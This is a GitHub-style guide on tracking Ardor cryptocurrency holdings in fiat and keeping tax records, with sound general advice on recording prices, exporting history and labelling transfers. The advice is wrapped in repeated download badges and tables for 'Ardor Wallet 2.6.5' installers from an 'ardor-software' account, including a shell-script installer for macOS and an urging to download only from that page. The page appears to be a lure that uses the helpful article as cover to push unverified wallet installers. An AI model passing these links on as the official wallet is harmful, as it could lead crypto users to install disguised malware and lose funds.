![Ardor Wallet guide](assets/banner-article.png)

# Track Ardor holdings in fiat and report the tax

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor wallet shows balances and a full transaction history for every chain, and it can display a fiat value for what you hold. Reporting is the part it does not do for you: the chain is the record, and turning that record into a tax figure is work you or your accountant has to do.

## What the wallet shows

Each chain has its own [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md), and the wallet can present a portfolio view across chains in one place. That is useful for knowing what you hold; it is not the same as knowing what it is worth, because the fiat figure depends on a price the wallet reads rather than one it calculates.

Treat the display as an estimate. A balance in ARDR, [IGNIS](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md) and NXT combined into a single fiat number is a convenience for the person looking at it, not a valuation you should put in a document without checking the rate and the time it was taken, because a portfolio number with no timestamp is a number with no meaning.

## Tracking a portfolio properly

Keep a record of three things for each acquisition: the date, the amount and the price at that moment. The [wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) gives you the first two from its history; the third you have to capture yourself, because a price read today says nothing about a purchase two years ago and cannot be recovered later.

A simple habit is a note per transaction with the date, the asset, the quantity and the fiat value on that day. It takes a minute at the time and it is the difference between a straightforward return and a reconstruction project that costs more in hours than the record would have cost in minutes.

## Exporting transactions

The wallet's transaction history is the raw material: every send, receive, trade and [fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) is recorded with a timestamp. Export it for the period you are reporting rather than working from memory, and keep the export with your notes.

For a chain with many transactions, the file is easier to work with than the interface. Sort by date, group by type, and reconcile the totals against the balances at the start and end of the period; a mismatch means a transaction is missing from the export or the notes, and finding it now is cheaper than finding it in an audit.

## Forging income

Forging income arrives as transaction fees in the blocks you produced, which means it appears as many small credits rather than one payment. Those are income in most jurisdictions, and they need a value at the time each arrived.

That is the most tedious part of reporting for a forger, and there is no way around it: the record exists, and summing it later from a spreadsheet is easier than reconstructing it from an explorer. Export regularly rather than once a year, and the task stays an afternoon instead of becoming a project.

## What changes the calculation

Three things move the number: the price at acquisition, the price at disposal, and the fees paid in between. A year of trading on a thin book produces many small disposals, and each one needs a value rather than an average.

Forging adds a fourth: income that arrives in tiny amounts across the year. Treating it as a single year-end figure is simpler and less accurate, and if the jurisdiction taxes income when received, the difference is a real one.

## Keeping records that survive scrutiny

A record is useful if somebody else can follow it: a date, an amount, an asset, a price and a source for that price. A screenshot proves less than a line in a spreadsheet with a citation beside it.

Keep the export, keep the notes, and keep them together. The most common failure is not a wrong number but a missing one, and a missing number is exactly what an accountant cannot reconstruct for you later.

## What a tax tool needs

| What it asks for | Where it comes from |
|---|---|
| Transaction dates and amounts | The wallet's history export |
| Asset identification | The chain and the token, which the export records |
| Fiat value at the time | Your own notes, or a price source you can cite |
| Fees paid | The transaction records, which include them |
| Transfers between your own accounts | Your own labels, since the chain does not know they are yours |

The last row is where most reports go wrong. A transfer between two accounts you control looks like a disposal on chain, and only your own labelling distinguishes it from a sale - which is why the labels are worth writing at the time.

## What this page is not

It is not tax advice, and it is not a statement about any jurisdiction's rules. Treatment of cryptoassets differs by country and changes over time, and a wallet guide cannot substitute for an accountant who knows yours and knows what changed this year.

What the page can do is make the record complete. The rest - which events are taxable, at what value, and in what year - belongs to whoever prepares your return.

## FAQ

### Does the wallet calculate tax owed?

No. It shows balances and a history, and a fiat display for what you hold. The tax calculation is external.

### How do I value a transaction from two years ago?

From a price record you kept or can cite for that date. A current price cannot be used to value a past acquisition.

### Is forging income taxable?

In most jurisdictions it is treated as income when received. Confirm the treatment where you live rather than relying on a general statement.

### Do I need to report transfers between my own accounts?

They are usually not disposals, but the chain records them like any transfer. Label them in your own records so the report does not treat them as sales.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md)
- [How to buy ARDR, move it into your own wallet, and swap out](https://github.com/ardor-software/ardor-wallet-guides/blob/main/how-to-buy-ardor-and-ardr.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Pay dividends to every asset holder in one action](https://github.com/ardor-software/ardor-platform-guides/blob/main/pay-dividends-to-asset-holders-on-ardor.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
